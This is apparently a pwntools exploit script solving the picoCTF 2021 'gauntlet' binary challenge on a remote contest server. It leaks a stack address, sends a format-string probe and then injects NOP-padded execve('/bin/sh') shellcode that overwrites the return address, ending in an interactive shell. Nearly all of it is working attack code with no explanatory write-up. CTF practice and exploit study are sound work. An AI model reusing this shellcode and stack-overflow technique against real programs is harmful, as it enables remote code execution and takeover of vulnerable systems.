from pwn import *

'''
[*] '/home/kali/Desktop/pico2021/gauntlet1/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

1) printf returns a stack address = 0x7fffffffe4b0

2) fgets size of 0x3e8 0x6022a0

3) fgets size of 0x3e8 0x6022a0


'''
local_bin = "./gauntlet"
elf = ELF(local_bin)
rop = ROP(elf)

p = remote("mercury.picoctf.net",24284)
#p = process(local_bin)
#p = gdb.debug(local_bin, '''
  	#break main
  	#break *main+48
  	#break *main+156
	#continue
	#''')

sleep(0)

output = p.recvuntil(b"\n")
print(output)
leak = output[:-1]
print("[+] Leak = ", output)
print("[+] Working leak = ", leak)

leak = leak.decode("utf-8") 
#leak = '0x' + leak
print("[+] Leaked stack address = ", (leak))

stack_addr = leak
print("[+] Stack address to overflow with = ", stack_addr)

offset_to_ret_address = 0x7fffffffe528 - 0x7fffffffe4b0
ret_address = int(leak,16) + offset_to_ret_address
print("[+] My stack pointer is at  = " ,hex(ret_address))



payload1 = b'%qx '* (23)
p.sendline(payload1)

output = p.recvuntil(b"\n")
print(output)
print("[+] Leak = ", output)

leak = output[-0x10+2:-1]
print("[+] Working leak = ", leak)

leak = leak.decode("utf-8") 
leak = '0x' + leak
print("[+] Leaked stack address = ", (leak))

shellcode = b'\x90' * (0x60 - 1 - 0x30)
shellcode += b'\x90'

#execve shellcode
shellcode += b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05"

shellcode += b'\x90' * (0x30 - 0x20 + 8) 
shellcode += p64(int(stack_addr,16))

p.sendline(shellcode)

p.interactive()